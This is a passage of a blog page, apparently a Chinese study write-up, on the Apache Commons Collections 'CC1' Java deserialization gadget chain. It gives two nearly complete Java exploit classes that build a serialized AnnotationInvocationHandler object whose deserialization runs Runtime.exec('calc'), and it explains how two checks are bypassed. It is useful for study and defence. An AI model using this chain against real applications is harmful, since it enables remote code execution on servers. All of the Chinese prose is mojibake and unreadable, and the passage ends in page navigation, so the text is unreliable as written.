class="line">chainedTransformer.transform(Runtime.class);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯å°†è¿™æ®µä»£ç æ”¾åœ¨expé‡Œé¢æ›¿æ¢æ‰å‰é¢å¸¸è§„çš„InvokerTransformerè¿˜æ˜¯æ‰§è¡Œä¸äº†ï¼Œæˆ‘ä»¬å°±éœ€è¦è§£å†³å…¶ä»–ä¸¤ä¸ªé—®é¢˜</p>
<h4 id="ç»•è¿‡ä¸¤ä¸ªifåˆ¤æ–­"><a href="#ç»•è¿‡ä¸¤ä¸ªifåˆ¤æ–­" class="headerlink" title="ç»•è¿‡ä¸¤ä¸ªifåˆ¤æ–­"></a>ç»•è¿‡ä¸¤ä¸ªifåˆ¤æ–­</h4><p>ç›®å‰çš„EXPå¦‚ä¸‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformerArray=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformerArray);</span><br><span class="line">        </span><br><span class="line">        Map&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationConstructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> annotationConstructor.newInstance(Target.class, transformedMap);</span><br><span class="line">        serialize(obj);  <span class="comment">//åºåˆ—åŒ–</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser1.bin&quot;</span>); <span class="comment">//ååºåˆ—åŒ–</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//åºåˆ—åŒ–æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser1.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//ååºåˆ—åŒ–æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬åœ¨ç¬¬ä¸€ä¸ªifåˆ¤æ–­è¯­å¥æ‰“ä¸€ä¸ªæ–­ç‚¹ç„¶åè¿›è¡Œè°ƒè¯•ï¼Œå‘ç°memberTypeä¸ºnullï¼Œè·Ÿä¸€ä¸‹å‘ç°</p>
<p><img src="/.io//pentest-notes\blog\blog\source_posts\javaååºåˆ—åŒ–ä¹‹cc1é“¾åˆ†æ.assets\webp17.webp" alt="webp17"></p>
<p>ä»”ç»†å®¡è®¡æºç åå‘ç°ï¼Œ<code>memberType</code>æ˜¯è·å–<strong>æ³¨è§£ä¸­æˆå‘˜å˜é‡</strong>çš„åç§°ï¼Œç„¶åå¹¶ä¸”æ£€æŸ¥<code>HashMap</code>é”®å€¼å¯¹ä¸­é”®åæ˜¯å¦æ˜¯å¯¹åº”çš„åç§°ã€‚æ³¨è§£ç±»ï¼ˆTargetæˆ–è€…Overrideï¼‰</p>
<p><img src="/.io//pentest-notes\blog\blog\source_posts\javaååºåˆ—åŒ–ä¹‹cc1é“¾åˆ†æ.assets\webp18.png" alt="webp18"></p>
<p>å…¶å®æ³¨è§£ç±»å°±é‚£å‡ ä¸ªï¼ŒOverrideçš„è¯æ˜¯æ²¡æœ‰æˆå‘˜å˜é‡çš„ï¼Œä½†Targetæœ‰æˆå‘˜å˜é‡ï¼Œå˜é‡åä¸ºvalue()</p>
<p><img src="/.io//pentest-notes\blog\blog\source_posts\javaååºåˆ—åŒ–ä¹‹cc1é“¾åˆ†æ.assets\webp19.png" alt="webp19"></p>
<p><img src="/.io//pentest-notes\blog\blog\source_posts\javaååºåˆ—åŒ–ä¹‹cc1é“¾åˆ†æ.assets\image-20251109130210849.png" alt="image-20251109130210849"></p>
<p>è¿™å°±æ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬åœ¨å‰é¢çš„EXPåˆ©ç”¨ç”¨åˆ°çš„æ˜¯Targetæ³¨è§£ç±»è€Œä¸æ˜¯Overrideæ³¨è§£ç±»ï¼Œç„¶åè¿˜è¦ä¿®æ”¹çš„ä¸€ç‚¹å°±æ˜¯æˆ‘ä»¬ä¼ å…¥çš„map.name</p>
<p><strong>ç¬¬äºŒä¸ªifï¼š</strong></p>
<p>çœ‹ç™½æ—¥æ¢¦ç»„é•¿çš„è§†é¢‘è¯´Map&lt;xxx,xxx&gt;çš„ç¬¬ä¸€ä¸ªå‚æ•°å¾—æ˜¯è¦è·Ÿæ³¨è§£ç±»æˆå‘˜å˜é‡åä¸€è‡´ï¼Œè·Ÿç€è°ƒè¯•å‘ç°ç¡®å®ï¼ŒMap&lt;xxx1,xxx2&gt;å…¶ä¸­xxx1å¾—èµ‹ä¸€ä¸ªStringå‹çš„valueæ‰èƒ½é€šè¿‡ç¬¬äºŒä¸ªifã€‚</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æ³¨è§£å®šä¹‰</span></span><br><span class="line"><span class="meta">@interface</span> MyAnnotation &#123;</span><br><span class="line">    String <span class="title function_">value</span><span class="params">()</span>;</span><br><span class="line">    String <span class="title function_">command</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ­£ç¡®æ„é€  - keyä¸æˆå‘˜åä¸€è‡´</span></span><br><span class="line">Map&lt;String, Object&gt; memberValues = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">memberValues.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;someValue&quot;</span>);      <span class="comment">// key = &quot;value&quot;</span></span><br><span class="line">memberValues.put(<span class="string">&quot;command&quot;</span>, <span class="string">&quot;calc.exe&quot;</span>);     <span class="comment">// key = &quot;command&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// è¿™æ ·memberTypes.get(&quot;value&quot;)èƒ½æ‰¾åˆ°String.class</span></span><br><span class="line"><span class="comment">// memberTypes.get(&quot;command&quot;)èƒ½æ‰¾åˆ°String.class</span></span><br></pre></td></tr></table></figure>

<p>è¿™æ ·å°±ç»•è¿‡äº†ä¸¤ä¸ªifï¼Œè¿›åˆ°æœ€åä¸€æ­¥çš„setValue()</p>
<h4 id="3ã€AnnotationInvocationHandlerç±»çš„readObject-æ–¹æ³•è°ƒç”¨-çš„setValue-æ–¹æ³•çš„å‚æ•°ä¸å¯æ§ã€‚"><a href="#3ã€AnnotationInvocationHandlerç±»çš„readObject-æ–¹æ³•è°ƒç”¨-çš„setValue-æ–¹æ³•çš„å‚æ•°ä¸å¯æ§ã€‚" class="headerlink" title="3ã€AnnotationInvocationHandlerç±»çš„readObject()æ–¹æ³•è°ƒç”¨ çš„setValue()æ–¹æ³•çš„å‚æ•°ä¸å¯æ§ã€‚"></a>3ã€<code>AnnotationInvocationHandler</code>ç±»çš„<code>readObject()</code>æ–¹æ³•è°ƒç”¨ çš„<code>setValue()</code>æ–¹æ³•çš„å‚æ•°ä¸å¯æ§ã€‚</h4><p>åœ¨åˆšåˆšçš„AnnotationInvocationHandlerç±»çš„æºç ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä»–readObjectæ–¹æ³•ä¸­çš„setValueçš„å‚æ•°å¹¶ä¸å¯æ§ï¼Œé‚£è¯¥æ€ä¹ˆåŠ</p>
<p><img src="/.io//pentest-notes\blog\blog\source_posts\javaååºåˆ—åŒ–ä¹‹cc1é“¾åˆ†æ.assets\webp20.png" alt="webp20"></p>
<p>æˆ‘ä»¬åªéœ€è¦è®©setValueæ–¹æ³•çš„å‚æ•°æ˜¯Runtime.classå°±è¡Œäº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ³¨æ„çœ‹åˆ°<code>org.apache.commons.collections.functors</code>åŒ…ä¸‹çš„<code>ConstantTransformer</code>ç±»ã€‚å®ƒé‡Œé¢çš„transformå°±æ˜¯è¿”å›æˆ‘ä»¬ä¼ å…¥çš„å¯¹è±¡ï¼Œå¦‚æœæˆ‘ä»¬ä¼ å…¥<code>Runtime.class</code>ï¼Œé‚£è¿”å›çš„ä¹Ÿå³æ˜¯<code>Runtime.class</code>ã€‚</p>
<p><img src="/.io//pentest-notes\blog\blog\source_posts\javaååºåˆ—åŒ–ä¹‹cc1é“¾åˆ†æ.assets\webp21-1762664629720-47.png" alt="webp21"></p>
<p>è¿™é‡Œæˆ‘ä»¬ç›´æ¥åœ¨ChainedTransformeré‡Œé¢newä¸€ä¸ªå®ä¾‹å°±è¡Œï¼Œè¿™æ ·ä»–è°ƒç”¨transformæ–¹æ³•çš„æ—¶å€™å°±ä¼šæŠŠä¼ å…¥çš„Objectï¼ˆè¿™é‡Œæˆ‘ä»¬é€‰æ‹©ä¼ å…¥Runtime.classï¼‰ç»™è¿”å›å‡ºæ¥.</p>
<p>é‚£ä¹ˆæœ€ç»ˆçš„expå¦‚ä¸‹</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformerArray=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),        <span class="comment">//è§£å†³é—®é¢˜ä¸€ï¼šAnnotationInvocationHandlerç±»çš„readObject()æ–¹æ³•è°ƒç”¨ çš„setValue()æ–¹æ³•çš„å‚æ•°ä¸å¯æ§</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformerArray);</span><br><span class="line"></span><br><span class="line">        Map&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;Timind&quot;</span>);</span><br><span class="line">        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationConstructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> annotationConstructor.newInstance(Target.class, transformedMap);</span><br><span class="line">        </span><br><span class="line">        serialize(obj);</span><br><span class="line">        unserialize(<span class="string">&quot;ser1.bin&quot;</span>); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//åºåˆ—åŒ–æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser1.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//ååºåˆ—åŒ–æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/.io//pentest-notes\blog\blog\source_posts\javaååºåˆ—åŒ–ä¹‹cc1é“¾åˆ†æ.assets\webp22.png" alt="webp22"></p>
<p>è´´ä¸€ä¸‹å¸ˆå‚…çš„é“¾å­ï¼š</p>
<p><img src="/.io//pentest-notes\blog\blog\source_posts\javaååºåˆ—åŒ–ä¹‹cc1é“¾åˆ†æ.assets\webp23.png" alt="webp23"></p>
<p>ä¸è¿‡åœ¨jdk1.8.0.71ä¸­ä¿®å¤äº†<code>AnnotationInvocationHandler</code>ç±»çš„readObjectæ–¹æ³•ï¼Œå› æ­¤CC1æ— æ•ˆäº†å…¶ä»–çš„é“¾å‡ºç°äº†ã€‚</p>
<p>ç°åœ¨cc1é“¾ä¹Ÿå¾ˆå°‘äº†ï¼Œä»…ä¾›å­¦ä¹ å‚è€ƒï¼Œå®æˆ˜æ„ä¹‰ä¹Ÿä¸å¤§ï¼Œä½†æ˜¯ä½œä¸ºä¸€ä¸ªå®‰å…¨ç ”ç©¶äººå‘˜ï¼Œåœ¨é¢å¯¹å®‰å…¨é—®é¢˜è¿˜æ˜¯ä¸èƒ½å¿ƒæµ®æ°”èºçš„ï¼Œå­¦ä¹ è¿˜æ˜¯å¾—è¸è¸å®å®çš„ã€‚</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>æ–‡ç« ä½œè€…: </span><span class="post-copyright-info"><a href="http://timind-sec.github.io">Timind</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>æ–‡ç« é“¾æ¥: </span><span class="post-copyright-info"><a href="http://timind-sec.github.io/posts/89a18773/">http://timind-sec.github.io/posts/89a18773/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>ç‰ˆæƒå£°æ˜: </span><span class="post-copyright-info">æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜æ¥æº <a href="http://timind-sec.github.io" target="_blank">Timind's cafÃ©</a>ï¼</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/butterfly-icon.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/posts/d57df2e9/" title="å…³äºk8sæ”»é˜²çš„éšç¬”"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">ä¸Šä¸€ç¯‡</div><div class="info-item-2">å…³äºk8sæ”»é˜²çš„éšç¬”</div></div><div class="info-2"><div class="info-item-1">k8sæ”»å‡»æ€è·¯ï¼šè§†é¢‘é“¾æ¥ï¼šã€ã€å°è¿ªå®‰å…¨ã€‘å…¨æ ˆç½‘ç»œå®‰å…¨ | æ¸—é€æµ‹è¯• | é«˜çº§çº¢è“å¯¹æŠ— V2024æœ€æ–°ç‰ˆ (å®Œ)ã€‘ https://www.bilibili.com/video/BV123yAYMEwb/?p=98&amp;share_source=copy_web&amp;vd_source=5a6a99263af87e552e4139cdec53fd37 &lt;åˆæ˜¯å¸ˆä»å°è¿ªçš„ä¸€å¤©&gt; å‚è€ƒæ–‡ç« é“¾æ¥ï¼šhttps://mp.weixin.qq.com/s/QEuQa0KVwykrMzOPdgEHMQ?scene=1  è¿™å¼ å›¾ç‰‡å¾ˆå¥½çš„å±•ç¤ºäº†çº¢é˜Ÿè§†è§’ä¸‹çš„k8sæ¶æ„ï¼Œå¯ä»¥ä»api-serverå¼€å§‹è¿›è¡Œæ”»å‡»ï¼š 1. æ”»å‡»ç‚¹ 1~4ï¼šæ”»å‡»K8Sç»„ä»¶ K8S ç»„ä»¶çš„é—®é¢˜ä¸»è¦æ˜¯æŒ‡å„ç»„ä»¶çš„ä¸å®‰å…¨é…ç½®ï¼Œæ”»å‡»ç‚¹1~4ç½—åˆ—äº†4ä¸ªæ¯”è¾ƒæœ‰ä»£è¡¨æ€§çš„ç»„ä»¶é—®é¢˜ï¼Œå³ API Server æœªæˆæƒè®¿é—®ã€etcd æœªæˆæƒè®¿é—®ã€kubelet æœªæˆæƒè®¿é—®ã€kube-proxy ä¸å®‰å…¨é…ç½®ã€‚ é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜æœ‰å¾ˆå¤šç»„ä»¶éƒ½å­˜åœ¨ç€ç±»ä¼¼çš„å®‰å…¨é—®é¢˜ï¼Œæ¯”å¦‚ dashboardã€docker ç­‰ç»„ä»¶ä¹Ÿå­˜åœ¨æœªæˆæƒè®¿é—®çš„éšæ‚£ï¼Œè¿™äº›éƒ½æ˜¯ ...</div></div></div></a><a class="pagination-related" href="/posts/c74d1264/" title="æµ…è°ˆpyramidæ¡†æ¶ä¸‹çš„æ ˆå¸§é€ƒé€¸"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">ä¸‹ä¸€ç¯‡</div><div class="info-item-2">æµ…è°ˆpyramidæ¡†æ¶ä¸‹çš„æ ˆå¸§é€ƒé€¸</div></div><div class="info-2"><div class="info-item-1">pyramidç®€ä»‹Pyramidä»¥å…¶é«˜æ•ˆç‡å’Œå¿«èŠ‚å¥çš„å¼€å‘èƒ½åŠ›è€Œå‡ºåã€‚å®˜æ–¹æ–‡æ¡£æ˜¯è¿™æ ·æè¿°çš„ï¼šPyramid is a small, fast, down-to-earth Python web framework. It is developed as part of the Pylons Project. It is licensed under a BSD-like license. æ­¤å¼€æºWebæ¡†æ¶æœ‰ä¸€ä¸ªç‹¬ç«‹äºå¹³å°çš„MVCç»“æ„ï¼Œæä¾›äº†å¼€å‘çš„æœ€ç®€é€”å¾„ã€‚æ­¤å¤–ï¼Œå®ƒè¿˜æ˜¯é«˜æ•ˆå¼€å‘é‡ç”¨ä»£ç çš„é¦–é€‰å¹³å°ä¹‹ä¸€ã€‚ æºç åˆ†æï¼ˆç†Ÿæ‚‰çš„é…æ–¹from tgctfâ€“webï¼‰12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061from pyramid.config import Configuratorfrom pyramid.request import Requestfrom pyramid.response import Resp...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Timind</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>å…¬å‘Š</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>ç›®å½•</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc1%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">javaååºåˆ—åŒ–ä¹‹cc1é“¾åˆ†æ</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.1.</span> <span class="toc-text">ä¸€ã€è°ƒè¯•ç¯å¢ƒæ­å»º</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%84%E4%BB%B6%E9%9C%80%E6%B1%82%EF%BC%9A"><span class="toc-number">1.1.1.</span> <span class="toc-text">ç»„ä»¶éœ€æ±‚ï¼š</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jdk%E7%89%88%E6%9C%AC%E9%9C%80%E6%B1%82%EF%BC%9A"><span class="toc-number">1.1.2.</span> <span class="toc-text">jdkç‰ˆæœ¬éœ€æ±‚ï¼š</span></a></li><li class="toc-item 